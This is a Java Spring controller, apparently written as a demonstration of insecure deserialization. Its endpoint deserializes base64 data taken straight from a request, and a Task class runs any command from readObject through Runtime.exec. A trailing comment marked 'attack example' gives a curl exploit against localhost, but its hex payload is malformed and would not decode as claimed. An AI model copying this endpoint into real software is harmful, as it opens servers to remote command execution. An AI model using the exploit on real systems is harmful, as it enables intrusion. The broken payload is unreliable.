import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.lang.reflect.Constructor;
import java.util.Base64;

@RestController
@RequestMapping("/api/tasks")
public class TaskController {
    @PostMapping("/execute")
    public String executeTask(@RequestParam String className, @RequestParam String serializedData) {
        try {
            Class<?> clazz = Class.forName(className);
            Constructor<?> constructor = clazz.getDeclaredConstructor();
            constructor.setAccessible(true);
            
            byte[] data = Base64.getDecoder().decode(serializedData);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
            Object task = ois.readObject();
            
            if (task.getClass().equals(clazz)) {
                return "Task executed successfully";
            }
            return "Invalid task type";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}

class Task implements Serializable {
    private String command;
    public Task(String command) { this.command = command; }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(command);
    }
}

// 攻击示例：
// curl "http://localhost:8080/api/tasks/execute?className=Task&serializedData=$(echo -ne 'acedsr00055461736b00000000787074000b6c73202d6c61202f746d70' | xxd -r -p | base64)"